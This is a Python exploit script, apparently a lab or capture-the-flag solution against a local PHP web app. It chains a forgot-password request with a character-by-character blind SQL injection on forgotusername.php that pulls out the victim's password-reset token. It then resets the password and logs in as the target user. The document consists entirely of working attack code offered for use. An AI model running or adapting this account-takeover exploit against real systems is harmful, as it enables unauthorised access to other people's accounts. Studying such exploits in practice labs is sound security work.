import requests

class LoginBypass:
    def __init__(self, session = None, base_url = "http://localhost:8000", target_user = "user1", new_password = "hacked"):
        self.session = session or requests.Session()
        self.base_url = base_url
        self.target_user = target_user
        self.new_password = new_password

    def _send_forgot_password(self, username):
        data = {"username": username}
        resp = self.session.post(f"{self.base_url}/forgotpassword.php", data=data)
        
        if "Email sent!" in resp.text:
            return True
        else:
            return False

    def _extract_pwd_reset_token(self,username):
        token = ""
        
        for i in range(1, 33):
            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
                payload = (
                    f"' UNION SELECT uid, username, password, description FROM users "
                    f"WHERE username='{username}' "
                    f"AND SUBSTR((SELECT token FROM tokens WHERE uid=(SELECT uid FROM users WHERE username='{username}') ORDER BY tid DESC LIMIT 1), {i}, 1)='{char}' -- "
                )
                            
                resp = self.session.post(f"{self.base_url}/forgotusername.php", data={"username": payload})

                if "User exists!" in resp.text:
                    token += char
                    break

                
        return token if token else None

    def _reset_password(self, token, new_password):
        data = {
            "token": token,
            "password1": new_password,
            "password2": new_password
        }
        
        resp = self.session.post(f"{self.base_url}/resetpassword.php", data=data)
        
        if "Password changed!" in resp.text:
            return True
        else:
            return False
        
    def _login(self, username, password):
        data = {
            "username": username,
            "password": password
        }

        resp = self.session.post(f"{self.base_url}/login.php", data=data)
        if f"Hello, {username}!" in resp.text:
            return True
        else:
            return False
        
    def run(self):
        print("Login Bypass Exploit Started")

        success = self._send_forgot_password(self.target_user)

        if not success:
            print("Failed to trigger forgot password.")
            return False

        token = self._extract_pwd_reset_token(self.target_user)

        if not token:
            print("Failed to extract token.")
            return False

        print(f"Extracted token: {token}")

        success = self._reset_password(token, self.new_password)

        if not success:
            print("Failed to reset password.")
            return False
        
        success = self._login(self.target_user, self.new_password)

        if success:
            print(f"Successfully logged in as {self.target_user}:{self.new_password}!")
            return True
        else:
            print("Failed to log in with new password.")
            return False

if __name__ == "__main__":
    bypass = LoginBypass()
    bypass.run()